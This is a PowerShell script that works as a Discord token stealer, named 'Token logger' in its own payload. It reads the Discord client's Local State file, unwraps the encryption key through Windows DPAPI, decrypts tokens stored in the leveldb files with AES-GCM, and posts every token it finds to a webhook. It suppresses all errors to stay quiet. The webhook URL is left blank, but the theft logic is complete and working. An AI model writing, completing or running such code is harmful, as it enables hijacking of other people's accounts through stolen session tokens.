$ErrorActionPreference = 'SilentlyContinue'
Add-Type -AssemblyName System.Security.Cryptography.ProtectedData -ErrorAction SilentlyContinue

$root    = Join-Path $env:APPDATA 'discord'
$ldbDir  = Join-Path $root 'Local Storage\leveldb'
$state   = Join-Path $root 'Local State'

$WebhookUrl = ""

try {
    $b64 = (Get-Content $state -Raw -ErrorAction SilentlyContinue | ConvertFrom-Json).os_crypt.encrypted_key
    $all = [Convert]::FromBase64String($b64)
    $enc = $all[5..($all.Length - 1)]
    $key = [System.Security.Cryptography.ProtectedData]::Unprotect($enc, $null, 'CurrentUser')

    $aes   = [System.Security.Cryptography.AesGcm]::new([byte[]]$key, 16)
    $found = [System.Collections.Generic.List[string]]::new()

    foreach ($f in Get-ChildItem $ldbDir -File -ErrorAction SilentlyContinue | Where-Object Extension -in '.ldb','.log') {
        $raw = [IO.File]::ReadAllText($f.FullName, [Text.Encoding]::Latin1)
        foreach ($m in [regex]::Matches($raw, 'dQw4w9WgXcQ:([A-Za-z0-9+/=-]+)')) {
            try {
                $b = [Convert]::FromBase64String($m.Groups[1].Value)
                if ($b.Length -lt 32) { continue }
                if ([Text.Encoding]::ASCII.GetString($b, 0, 3) -ne 'v10') { continue }
                $nonce = [byte[]]$b[3..14]
                $tag   = [byte[]]$b[($b.Length - 16)..($b.Length - 1)]
                $ct    = [byte[]]$b[15..($b.Length - 17)]
                $out   = [byte[]]::new($ct.Length)
                $aes.Decrypt($nonce, $ct, $tag, $out)
                $t = [Text.Encoding]::UTF8.GetString($out).Trim('"')
                if ($t -match '^[\w-]{24,30}\.[\w-]{6,7}\.[\w-]{27,120}$') {
                    if (-not $found.Contains($t)) {
                        $found.Add($t)
                    }
                }
            } catch {}
        }
    }
    $aes.Dispose()

    $uniqueTokens = $found | Select-Object -Unique

    if ($uniqueTokens.Count -gt 0) {
        $embeds = foreach ($tok in $uniqueTokens) {
            @{
                title = "TOKEN ENCONTRADO"
                color = 5763719
                fields = @(
                    @{
                        name  = "TOKEN"
                        value = "````$tok````"
                    }
                )
            }
        }

        $body = @{
            username   = "Token logger"
            embeds     = @($embeds)
            avatar_url = "https://malwarefox.com/wp-content/uploads/2017/11/hacker-1.png"
        } | ConvertTo-Json -Depth 10

        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType 'application/json' -ErrorAction SilentlyContinue
    }
} catch {}